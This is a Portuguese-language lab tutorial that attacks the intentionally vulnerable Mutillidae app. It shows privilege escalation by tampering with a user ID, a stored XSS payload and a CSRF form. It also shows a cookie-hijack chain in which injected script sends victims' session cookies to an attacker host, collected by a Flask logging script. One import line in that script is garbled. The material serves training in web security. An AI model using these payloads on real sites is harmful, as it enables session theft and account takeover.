# Web-Attack
Web Application Attack


## Ataques em Aplicação Web 


### Exercício 1 - Abusando da aplicação com BurpSuite
* Abrir o mutillidae:	http://10.10.10.16:8080/mutillidae
* Criar um **usuário**
* Abrir o **BurpSuite** e capturar a requisição de login para identificar o **ID**
* A aplicação atribuiu o **ID 24** para o usuário

    ![](https://l2r1.com.br/llll/uid.PNG)

* Se alterarmos o **ID** para **1** 
   
   ![](https://l2r1.com.br/llll/uid2.PNG)

* É possível identificar que o usuário alterou para root

   ![](https://l2r1.com.br/llll/root.PNG)


| XSS         |
| ------------------ |
### Exercício 2 - XSS 
* Abrir o mutillidae: http://10.10.10.16:8080/mutillidae
* Realizar logon com o usuário criado.
* Acessar ****OWASP 2013 > A CSRF > Add to your blog****
* Inserir dados no blog:
    
    ```
    <script>alert(document.cookie)</script>
    ```

    ![](https://l2r1.com.br/llll/XSS.PNG)


| CSRF         |
| ------------------ |

### Exercício 3 - CSRF 
* Abrir o mutillidae: http://10.10.10.16:8080/mutillidae
* Acessar **OWASP 2013 > A CSRF > Add to your blog**
* Inserir dados no blog e capturar no BurpSuite

    ![](https://l2r1.com.br/llll/csrf0.PNG)

* Utilizaremos os parâmetros capturados no BurpSuite para nosso ataque CSRF e alteraremos o conteúdo.
    * csrf-token = NULL
	* blog_entry = "Blog Hackeado"
	* add-to-your-blog-php-submit-button = "Save Blog Entry"


* Criar um HTML com as seguintes informações
    
    **CSRF.html**
    ```
    <form name="csrf" action="https://192.168.56.101/mutillidae/index.php?page=add-to-your-blog.php" method="POST">
    <input type="hidden" name='csrf-token' value=''>
    <input type="hidden" name='blog_entry' value='Blog Hackeado'>
    <input type="hidden" name='add-to-your-blog-php-submit-button' value='Save Blog Entry'>
    </form>
    ```
* Uma vez que o usuário autenticado abre o arquivo html, o CSRF é executado.

    ![](https://l2r1.com.br/llll/csrf.PNG)


| COOKIE HIJACK      |
| ------------------ |

### Exercício 4 - Cookie Hijack 

* Realizaremos um XSS via CSRF e com Cookie Hijack

    
	Abrir um html encode (https://emn178.github.io/online-tools/html_encode.html) e inserir o seguinte abaixo (O objetivo é encodar nosso código para não quebrar o script):
	```
	<script>document.location="http://10.10.10.13:8080/?c="+document.cookie;</script>
    ```
	
* A informação encodada deverá ficar como descrito abaixo:
	```
	&lt;script&gt;document.location=&quot;http://10.10.10.13:8080/?c=&quot;+document.cookie;&lt;/script&gt;
    ```
    
* Alterar o HTML anterior inserindo os dados:
    ```
      <form name="csrf" action="https://192.168.56.101/mutillidae/index.php?page=add-to-your-blog.php" method="POST">
      <input type="hidden" name='csrf-token' value=''>
      <input type="hidden" name='blog_entry' value='&lt;script&gt;document.location=&quot;http://10.10.10.13:8080/?c=&quot;+document.cookie;&lt;/script&gt;'>
      <input type="hidden" name='add-to-your-blog-php-submit-button' value='Save Blog Entry'>
      </form>
	```
* Criar um Script python: 

    **get_cookie.py**

    ```
    from flask import Flask, request, redirect
    from  import 
    app = Flask(__name__)  	# cria instancia do app
    @app.route('/') 		
    def cookie():
          # Captura os cookie e salva no arquivo ”cookies.txt"
	    cookie = request.args.get('c')
	    f = open("cookies.txt","a")
	    f.write(cookie + ' ' + str(datetime.now()) + '\n')
	    f.close()
          # Redireciona o usuário para outra página
	    return redirect("http://pudim.com.br")
    if __name__ == "__main__":
	    app.run(host = '0.0.0.0', port=8080) 
    ```	
	
* Executar o script get_cookie.py
    ```
    python get_cookie.py
    ```
    ![](https://l2r1.com.br/llll/gc.PNG)

* Ao abrir o arquivo html na maquina da vítima, é possível identificar que o cookie foi capturado na maquina do atacante:

	![](https://l2r1.com.br/llll/gc2.PNG)

* A partir daí é possível se conectar como usuário apenas usando o cookie de sessão.

* Basta copiar o cookie da sessão: **v6qql07p4ee7re69p79t7fq8ru** e substituir na pagina do atacante
    
    ![](https://l2r1.com.br/llll/cookie.PNG)
    
* Ao realizar refresh na página você verá que o atacante conseguiu se logar na aplicação com o cookie do usuário 

    ![](https://l2r1.com.br/llll/hijack.PNG)
    
* Qualquer usuário autenticado que abrir a página do blog, terá seu cookie capturado.

    ![](https://l2r1.com.br/llll/gc3.PNG)
    
* O arquivo cookie.txt também contém as informações dos cookies.

    ![](https://l2r1.com.br/llll/gc4.PNG)
